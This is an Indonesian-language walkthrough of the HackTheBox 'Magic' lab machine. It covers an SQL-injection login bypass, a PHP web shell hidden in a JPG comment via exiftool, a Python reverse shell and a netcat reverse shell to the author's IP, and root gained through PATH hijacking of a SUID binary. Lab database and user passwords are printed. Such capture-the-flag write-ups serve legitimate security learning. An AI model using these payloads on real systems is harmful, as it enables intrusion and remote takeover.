# Magic (Linux)

![Image](img/1.PNG)

HackTheBox Magic dengan operating system Linux

### Enumeration

Mari kita mulai dengan enumerasi port menggunakan nmap 

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClcZO7AyXva0myXqRYz5xgxJ8ljSW1c6xX0vzHxP/Qy024qtSuDeQIRZGYsIR+kyje39aNw6HHxdz50XSBSEcauPLDWbIYLUMM+a0smh7/pRjfA+vqHxEp7e5l9H7Nbb1dzQesANxa1glKsEmKi1N8Yg0QHX0/FciFt1rdES9Y4b3I3gse2mSAfdNWn4ApnGnpy1tUbanZYdRtpvufqPWjzxUkFEnFIPrslKZoiQ+MLnp77DXfIm3PGjdhui0PBlkebTGbgo4+U44fniEweNJSkiaZW/CuKte0j/buSlBlnagzDl0meeT8EpBOPjk+F0v6Yr7heTuAZn75pO3l5RHX
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOVyH7ButfnaTRJb0CdXzeCYFPEmm6nkSUd4d52dW6XybW9XjBanHE/FM4kZ7bJKFEOaLzF1lDizNQgiffGWWLQ=
|   256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0dM4nfekm9dJWdTux9TqCyCGtW5rbmHfh/4v3NtTU1
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=6/18%OT=22%CT=1%CU=32655%PV=Y%DS=2%DC=T%G=Y%TM=5EEBB19
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)OPS(O1=M
OS:54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%
OS:O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%
OS:DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=
OS:%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%
OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
```

Kita bisa melihat 2 port yang terbuka yaitu port 22 (SSH) dan 80 (HTTP).

Mari kita coba cek website yang sedang berjalan di port 80

![Image](img/2.PNG)

Sekilas tidak ada hal menarik di websitenya, namun di bagian kiri bawah terdapat tombol untuk menuju ke login page

![Image](img/3.PNG)

Penulis mencoba untuk menebak-nebak username dan password menggunakan kombinasi yang biasanya digunakan seperti admin:admin admin:password namun tidak ada yang berhasil, kemudian mencoba sekali lagi untuk menggunakan SQL Injection ternyata berhasil menggunakan teknil SQLi Tautology untuk bypass login.

![Image](img/4.PNG)

### User

Penulis menemukan tempat untuk melakukan file upload, mari kita coba untuk upload file .php untuk mendapatkan reverse shell

![Image](img/5.PNG)

Sayangnya tempat file upload tadi cuma memperbolehkan file format JPG, JPEG, dan PNG (file-file gambar saja)

Terdapat banyak teknik dalam melewati pengecekan filetype dan menyelundupkan php code untuk di execute kemudian, seperti mengganti file header, menggunakan double extension, menambahkan byte magic number dan lain lain.

Pada kasus ini penulis akan menggunakan double extension dan menyelipkan payload php di bagian comment sebuah image file menggunakan tool bernama exiftool

```
exiftool -comment='<?php echo "<pre>";system($_GET['cmd']);?>' image.jpg

mv image.jpg > rcev2.php.jpg
```

Kenapa ada <pre> ? Biar lebih mudah dilihat output dari system nya, tidak tercampur2 dengan bytes dari jpg aslinya.

Upload rcev2.php.jpg

![Image](img/6.PNG)

Berhasil melakukan command ls, karena kita tahu RCE sudah berhasil dijalankan sekarang kita bisa menggunakan payload untuk membuat reverse shell kembali ke mesin lokal kita.

```
Python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Pada mesin ini penulis menyadari bahwa python2 tidak terinstall namun python3 tersedia

Berhasil mendapatkan reverse shell sebagai www-data

Setelah masuk, penulis melakukan enumerasi dan menemukan db.php

![Image](img/7.PNG)

Dari file db.php tadi kita mendapatkan username dan password

Theseus: iamkingtheseus

Kredensial diatas tidak bisa digunakan untuk login di SSH atau SU namun bisa digunakan untuk login di service mySQL

Walaupun binary file mySQL tidak ada, namun ternyata penulis menemukan mysqldump

Jadi mari kita coba saja command untuk melakukan dumping data dari database mysql

```
mysqldump -u theseus -p --all-databases 

Enter password: iamkingtheseus
```

![Image](img/8.PNG)

Dapat creds admin:Th3s3usW4sK1ng untuk su di terminal

![Image](img/9.PNG)

### Root

Menggunakan enumeration script untuk linux seperti LinEnum.sh kita bisa menemukan binary SUID yang tidak biasanya ada, bernama sysinfo

```
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
```

Binary ini sebenarnya menjalankan binary built in lainnya

- Hardware Info = lshw -short

- Disk Info = fdisk -l

- CPU Info = cat /proc/cpuinfo

- Mem Usage = free -h

Jadi kita akan menipu script yang running as root ini untuk menjalankan binary fdisk yang sudah kita modifikasi, dengan membuat custom binary yang isinya reverse shell payload dan kita rubah path variablenya ke tempat custom binary kita

- cd /tmp

- touch fdisk

- echo “/tmp/netcat -e /bin/bash 10.1014.6 4444” > fdisk

- export PATH=/tmp:$PATH

- chmod +x fdisk netcat

- sysinfo

# Rooted !